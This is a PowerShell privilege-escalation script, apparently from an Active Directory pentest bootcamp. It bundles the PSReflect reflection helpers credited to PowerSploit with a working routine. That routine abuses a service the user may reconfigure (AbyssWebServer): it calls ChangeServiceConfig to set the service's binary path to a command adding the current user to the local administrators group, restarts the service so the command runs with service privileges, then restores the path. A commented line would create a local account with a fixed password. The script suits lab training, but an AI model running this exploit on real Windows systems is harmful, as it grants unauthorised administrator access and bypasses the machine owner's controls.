# Pentester Academy Bootcamp - Attacking and Defending Active Directory

# If the user has the ability to "ChangeConfig" on a service they can change the path to any command.
# The command can be to create a local user or add a local user/domain user to the administrators group on the local machine

# https://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/
function New-InMemoryModule {
    <#
    .SYNOPSIS
    Creates an in-memory assembly and module
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    .DESCRIPTION
    When defining custom enums, structs, and unmanaged functions, it is
    necessary to associate to an assembly module. This helper function
    creates an in-memory module that can be passed to the 'enum',
    'struct', and Add-Win32Type functions.
    .PARAMETER ModuleName
    Specifies the desired name for the in-memory assembly and module. If
    ModuleName is not provided, it will default to a GUID.
    .EXAMPLE
    $Module = New-InMemoryModule -ModuleName Win32
    #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )
    
        $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
        $LoadedAssemblies = $AppDomain.GetAssemblies()
    
        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }
    
        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = $AppDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    
        return $ModuleBuilder
    }
    
    
    # A helper function used to reduce typing while defining function
    # prototypes for Add-Win32Type.
    function func {
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,
    
            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,
    
            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,
    
            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,
    
            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,
    
            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,
    
            [String]
            $EntryPoint,
    
            [Switch]
            $SetLastError
        )
    
        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }
    
        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
        if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    
        New-Object PSObject -Property $Properties
    }
    
    
    function Add-Win32Type
    {
    <#
    .SYNOPSIS
    Creates a .NET type for an unmanaged Win32 function.
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: func
    .DESCRIPTION
    Add-Win32Type enables you to easily interact with unmanaged (i.e.
    Win32 unmanaged) functions in PowerShell. After providing
    Add-Win32Type with a function signature, a .NET type is created
    using reflection (i.e. csc.exe is never called like with Add-Type).
    The 'func' helper function can be used to reduce typing when defining
    multiple function definitions.
    .PARAMETER DllName
    The name of the DLL.
    .PARAMETER FunctionName
    The name of the target function.
    .PARAMETER EntryPoint
    The DLL export function name. This argument should be specified if the
    specified function name is different than the name of the exported
    function.
    .PARAMETER ReturnType
    The return type of the function.
    .PARAMETER ParameterTypes
    The function parameters.
    .PARAMETER NativeCallingConvention
    Specifies the native calling convention of the function. Defaults to
    stdcall.
    .PARAMETER Charset
    If you need to explicitly call an 'A' or 'W' Win32 function, you can
    specify the character set.
    .PARAMETER SetLastError
    Indicates whether the callee calls the SetLastError Win32 API
    function before returning from the attributed method.
    .PARAMETER Module
    The in-memory module that will host the functions. Use
    New-InMemoryModule to define an in-memory module.
    .PARAMETER Namespace
    An optional namespace to prepend to the type. Add-Win32Type defaults
    to a namespace consisting only of the name of the DLL.
    .EXAMPLE
    $Mod = New-InMemoryModule -ModuleName Win32
    $FunctionDefinitions = @(
      (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
      (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
      (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
    )
    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    $Ntdll = $Types['ntdll']
    $Ntdll::RtlGetCurrentPeb()
    $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
    $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
    .NOTES
    Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
    When defining multiple function prototypes, it is ideal to provide
    Add-Win32Type with an array of function signatures. That way, they
    are all incorporated into the same in-memory module.
    #>
    
        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [String]
            $DllName,
    
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [String]
            $FunctionName,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [String]
            $EntryPoint,
    
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [Type]
            $ReturnType,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Type[]]
            $ParameterTypes,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Switch]
            $SetLastError,
    
            [Parameter(Mandatory=$True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
    
            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )
    
        BEGIN
        {
            $TypeHash = @{}
        }
    
        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }
    
                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)
    
                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }
    
                    $i++
                }
    
                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                $EntryPointField = $DllImport.GetField('EntryPoint')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
    
                if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
    
                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField,
                                               $CallingConventionField,
                                               $CharsetField,
                                               $EntryPointField),
                    [Object[]] @($SLEValue,
                                 ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                                 ([Runtime.InteropServices.CharSet] $Charset),
                                 $ExportedFuncName))
    
                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }
    
        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }
    
            $ReturnTypes = @{}
    
            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
    
                $ReturnTypes[$Key] = $Type
            }
    
            return $ReturnTypes
        }
    }
    
    function field {
        Param (
            [Parameter(Position = 0, Mandatory=$True)]
            [UInt16]
            $Position,
    
            [Parameter(Position = 1, Mandatory=$True)]
            [Type]
            $Type,
    
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
    
            [Object[]]
            $MarshalAs
        )
    
        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }
    
    
    function struct
    {
    <#
    .SYNOPSIS
    Creates an in-memory struct for use in your PowerShell session.
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: field
    .DESCRIPTION
    The 'struct' function facilitates the creation of structs entirely in
    memory using as close to a "C style" as PowerShell will allow. Struct
    fields are specified using a hashtable where each field of the struct
    is comprosed of the order in which it should be defined, its .NET
    type, and optionally, its offset and special marshaling attributes.
    One of the features of 'struct' is that after your struct is defined,
    it will come with a built-in GetSize method as well as an explicit
    converter so that you can easily cast an IntPtr to the struct without
    relying upon calling SizeOf and/or PtrToStructure in the Marshal
    class.
    .PARAMETER Module
    The in-memory module that will host the struct. Use
    New-InMemoryModule to define an in-memory module.
    .PARAMETER FullName
    The fully-qualified name of the struct.
    .PARAMETER StructFields
    A hashtable of fields. Use the 'field' helper function to ease
    defining each field.
    .PARAMETER PackingSize
    Specifies the memory alignment of fields.
    .PARAMETER ExplicitLayout
    Indicates that an explicit offset for each field will be specified.
    .EXAMPLE
    $Mod = New-InMemoryModule -ModuleName Win32
    $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
    }
    $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
    }
    # Example of using an explicit layout in order to create a union.
    $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
    } -ExplicitLayout
    .NOTES
    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Struct. :P
    #>
    
        [OutputType([Type])]
        Param (
            [Parameter(Position = 1, Mandatory=$True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
    
            [Parameter(Position = 2, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,
    
            [Parameter(Position = 3, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,
    
            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
    
            [Switch]
            $ExplicitLayout
        )
    
        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }
    
        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'
    
        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }
    
        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    
        $Fields = New-Object Hashtable[]($StructFields.Count)
    
        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }
    
        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']
    
            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']
    
            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
    
            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
    
                $NewField.SetCustomAttribute($AttribBuilder)
            }
    
            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }
    
        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    
        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    
        $StructBuilder.CreateType()
    }
    
    
    
# Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

$serviceInfo = Get-Service -Name AbyssWebServer
#$serviceInfo = Get-Service -Name SNMPTRAP
$serviceName = $serviceInfo.Name
#$serviceInfo | Get-Member
#$serviceInfo.Status

# Query WMI to gather the PathName
$serviceDetails = Get-CimInstance win32_service -Filter "Name='$ServiceName'"

# Display Members of the object that are present
#$serviceDetails | Get-Member

#$currentPath = $serviceDetails.PathName
#$currentPath
# Environment variables for the current logged in user account
$username = $env:USERNAME
$domain = $env:USERDOMAIN
$usernameDomain = $domain + "\" + $username
#$usernameDomain

$commandList = @()
# Command that you want executed
$commandList += "net localgroup administrators $($usernameDomain) /add"
#$commandList += "net user /add test123 FlyAhead45678"

# Change the service back to what it was initially
$commandList += "C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service"
#$command = "%SystemRoot%\System32\snmptrap.exe"

ForEach ($c in $commandList) {
    # Stop the Service
    Stop-Service -Name $serviceName -ErrorAction Stop

    # Update the pathname with the command
    # Pathname by default is a readonly property
    #$serviceDetails.PathName = $command
    $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
    $ReadControl = 0x00000002
    #$ServiceName = "AbyssWebServer"
    $TargetService = Get-Service -Name $serviceName 
    $ServiceHandle = $GetServiceHandle.Invoke($TargetService, @($ReadControl))
    $SERVICE_NO_CHANGE = [UInt32]::MaxValue

    $Module = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
        (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode)  
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
    $Advapi32 = $Types['advapi32']
    $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$c", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    #$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
  

    # Start the Service with the Command as the Pathname
    Start-Service -Name $serviceName -ErrorAction SilentlyContinue

    # Pause - Wait for the execution to complete
    Start-Sleep 2

    Stop-Service -Name $serviceName -ErrorAction Stop
    #$serviceDetails.PathName = $currentPath

}

Start-Service -Name AbyssWebServer
    
    
    